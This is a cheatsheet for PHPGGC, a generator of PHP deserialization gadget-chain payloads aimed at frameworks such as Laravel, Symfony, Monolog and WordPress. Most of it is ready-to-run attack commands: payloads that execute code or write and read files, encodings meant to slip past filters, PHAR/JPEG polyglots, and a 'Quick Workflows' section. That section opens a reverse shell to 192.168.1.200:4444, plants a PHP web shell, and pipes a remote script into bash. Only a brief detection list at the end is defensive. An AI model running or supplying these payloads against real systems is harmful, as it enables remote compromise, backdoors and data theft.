# PHPGGC — Cheatsheet

## Quick Reference

```bash
phpggc <chain> [parameters]      # Generate payload
phpggc -l [filter]               # List chains
phpggc -i <chain>                # Chain info
```

## Core Usage

```bash
# List all chains
phpggc -l

# List Laravel chains
phpggc -l laravel

# Chain information
phpggc -i monolog/rce1

# RCE (command execution)
phpggc Laravel/RCE1 system id

# RCE (PHP code)
phpggc Monolog/RCE5 'phpinfo();'

# RCE (function call)
phpggc Symfony/RCE4 system "cat /etc/passwd"

# File write
phpggc SwiftMailer/FW1 /var/www/html/shell.php /tmp/local/shell.php

# File read
phpggc CodeIgniter4/FR1 /etc/passwd

# Output to file
phpggc -o /tmp/payload.txt Laravel/RCE1 system id
```

## Encoding

```bash
phpggc -b Laravel/RCE1 system id          # Base64
phpggc -u Laravel/RCE1 system id          # URL encode
phpggc -s Laravel/RCE1 system id          # Soft URL encode (readable)
phpggc -j Laravel/RCE1 system id          # JSON
phpggc -b -u Laravel/RCE1 system id       # Base64 + URL encode
phpggc -u -u Laravel/RCE1 system id       # Double URL encode
```

## Enhancements

```bash
phpggc -f Laravel/RCE1 system id          # Fast destruct
phpggc -a Laravel/RCE1 system id          # ASCII strings
phpggc -A Laravel/RCE1 system id          # Armor strings
phpggc -n Os Laravel/RCE1 system id       # Plus numbers (bypass regex)
phpggc -w /tmp/wrapper.php Slim/RCE1 system id  # Custom wrapper
```

## PHAR Generation

```bash
# PHAR format
phpggc -p phar -o /tmp/out.phar Monolog/RCE1 system id

# ZIP format
phpggc -p zip -o /tmp/out.zip.phar Monolog/RCE1 system id

# Polyglot JPEG/PHAR
phpggc -pj /tmp/image.jpg -o /tmp/polyglot.jpg Monolog/RCE1 system id

# TAR format
phpggc -p tar -o /tmp/out.tar.phar Monolog/RCE1 system id
```

## Testing

```bash
# Test chain in current environment
phpggc Monolog/RCE2 --test-payload

# Test specific versions
python3 test-gc-compatibility.py monolog/monolog monolog/rce1 monolog/rce3

# Test specific versions
python3 test-gc-compatibility.py monolog/monolog:2.3.0,1.25.4 monolog/rce1
```

## Common Chains

| Chain | Framework | Type | Vector |
|-------|-----------|------|--------|
| Laravel/RCE1 | Laravel 5.4.27 | Function call | __destruct |
| Laravel/RCE2 | Laravel 5.4-8.6.9+ | Function call | __destruct |
| Laravel/RCE7 | Laravel <=8.16.1 | Function call | __destruct |
| Symfony/RCE1 | Symfony 3.3 | PHP code | __destruct |
| Symfony/RCE4 | Symfony 3.3 | Function call | __destruct |
| Monolog/RCE1 | Monolog 1.x | Function call | __destruct |
| Monolog/RCE9 | Monolog 2.x-3.x | Function call | __toString |
| Doctrine/RCE1 | Doctrine 1.5.1-2.7.2 | PHP code | __destruct |
| Doctrine/FW2 | Doctrine 2.3-2.8.5 | File write | __destruct |
| SwiftMailer/FW1 | SwiftMailer | File write | __destruct |
| WordPress/RCE1 | WordPress | Function call | __destruct |
| Drupal7/RCE1 | Drupal 7 | PHP code | __destruct |
| Magento/RCE1 | Magento | Function call | __destruct |

## Docker

```bash
# Build
docker build -t phpggc https://github.com/ambionics/phpggc.git

# Generate payload
docker run phpggc Laravel/RCE1 system id

# Test chain
docker run -v "$(pwd)":/app -w /app phpggc Monolog/RCE9 --test-payload

# Polyglot
docker run -v "$(pwd)":/images phpggc -pj /images/img.jpg -o /images/out.phar Monolog/RCE1 system id
```

## Programmatic API

```php
<?php
include("phpggc/lib/PHPGGC.php");
$gc = new \GadgetChain\Guzzle\RCE1();
$parameters = $gc->process_parameters(['function' => 'system', 'parameter' => 'id']);
$object = $gc->generate($parameters);
$serialized = serialize($object);
print($serialized . "\n");
```

## Quick Workflows

```bash
# Laravel RCE → reverse shell
phpggc Laravel/RCE2 system "bash -c 'bash -i >& /dev/tcp/192.168.1.200/4444 0>&1'"

# Symfony → write web shell
phpggc Symfony/RCE2 'file_put_contents("/var/www/html/sh.php", "<?php system(\$_GET[\"c\"]); ?>");'

# Doctrine → file write
phpggc Doctrine/FW2 /var/www/html/shell.php /tmp/shell.php

# WordPress → command execution
phpggc WordPress/RCE1 system "curl http://192.168.1.200/rev.sh | bash"

# PHAR → upload and trigger
phpggc -p phar -o shell.jpg Monolog/RCE1 system id
# Upload shell.jpg, trigger via: file_exists($_GET['f'])
```

## Chain Types

| Type | Description | Example |
|------|-------------|---------|
| RCE (Command) | Executes OS command | `id` |
| RCE (PHP code) | Evaluates PHP code | `phpinfo();` |
| RCE (Function call) | Calls function with args | `system id` |
| File write | Writes file to disk | FW1, FW2 |
| File read | Reads file from disk | FR1 |
| File delete | Deletes file | FD1 |
| Include | PHP file inclusion | Various |

## Requirements

- PHP >= 5.6
- Target framework with vulnerable classes
- Autoloading in target application
- Specific framework version matching chain

## Limitations

- Chains are version-specific — always verify compatibility
- PHAR requires stream wrapper triggers (file_exists, fopen, include)
- Some chains require authenticated sessions
- Null bytes in payloads — use encoders for transport
- No gadget chains for all frameworks
- PHP 7.2+ restricts `+` to int/float types

## Detection Indicators

- Serialized data in HTTP parameters (`O:`, `a:`, `s:`)
- PHAR files in uploads
- Base64-encoded payloads in cookies/POST
- Gadget class names in serialized strings
- File writes after deserialization
- RCE immediately after unserialize() calls
